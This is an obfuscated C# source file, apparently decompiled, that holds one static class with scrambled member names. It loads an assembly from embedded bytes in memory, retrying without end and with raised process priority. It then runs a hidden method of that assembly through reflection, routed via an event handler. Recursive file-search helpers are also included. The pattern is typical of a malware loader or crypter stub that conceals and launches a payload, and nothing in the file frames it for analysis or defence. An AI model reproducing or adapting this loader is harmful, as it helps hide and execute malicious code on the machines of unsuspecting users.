using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

internal static class qfgsa
{
	[CompilerGenerated]
	private static EventHandler edoqq;

	public static event EventHandler dihxx
	{
		[CompilerGenerated]
		add
		{
			EventHandler eventHandler = edoqq;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Combine(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref edoqq, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			EventHandler eventHandler = edoqq;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Remove(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref edoqq, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
	}

	public static void mnitg()
	{
		dihxx += mnith;
		edoqq(((Assembly)mnitk()).GetType("Bjjvpmpfuovbicae.Lbhpdjdtv"), null);
	}

	private static void mnith(object sender, EventArgs e)
	{
		((Type)sender).InvokeMember("Knzcjm", BindingFlags.InvokeMethod, null, null, null);
	}

	public static FileInfo[] mniti(this DirectoryInfo bfjsj, params string[] bfjsk)
	{
		List<FileInfo> list = new List<FileInfo>();
		foreach (string searchPattern in bfjsk)
		{
			list.AddRange(bfjsj.GetFiles(searchPattern));
		}
		return list.ToArray();
	}

	public static FileInfo mnitj(this DirectoryInfo bfjsj, string bfjsk)
	{
		FileInfo[] files = bfjsj.GetFiles(bfjsk);
		if (files.Length != 0)
		{
			return files[0];
		}
		DirectoryInfo[] directories = bfjsj.GetDirectories();
		int num = 0;
		FileInfo fileInfo;
		while (true)
		{
			if (num < directories.Length)
			{
				fileInfo = directories[num].mnitj(bfjsk);
				if (fileInfo != null)
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return fileInfo;
	}

	private static object mnitk()
	{
		while (true)
		{
			try
			{
				using (Process process = Process.GetCurrentProcess())
				{
					process.PriorityClass = ProcessPriorityClass.High;
				}
				return Thread.GetDomain().Load(qfgrz.dymgs());
			}
			catch
			{
			}
		}
	}

	public static FileInfo mnitl(this DirectoryInfo bfjsj, Func<FileInfo, bool> bfjsk)
	{
		FileInfo[] files = bfjsj.GetFiles();
		int num = 0;
		FileInfo fileInfo;
		while (true)
		{
			if (num < files.Length)
			{
				fileInfo = files[num];
				if (bfjsk != null && bfjsk(fileInfo))
				{
					break;
				}
				num++;
				continue;
			}
			DirectoryInfo[] directories = bfjsj.GetDirectories();
			num = 0;
			FileInfo fileInfo2;
			while (true)
			{
				if (num < directories.Length)
				{
					fileInfo2 = directories[num].mnitl(bfjsk);
					if (fileInfo2 != null)
					{
						break;
					}
					num++;
					continue;
				}
				return null;
			}
			return fileInfo2;
		}
		return fileInfo;
	}
}
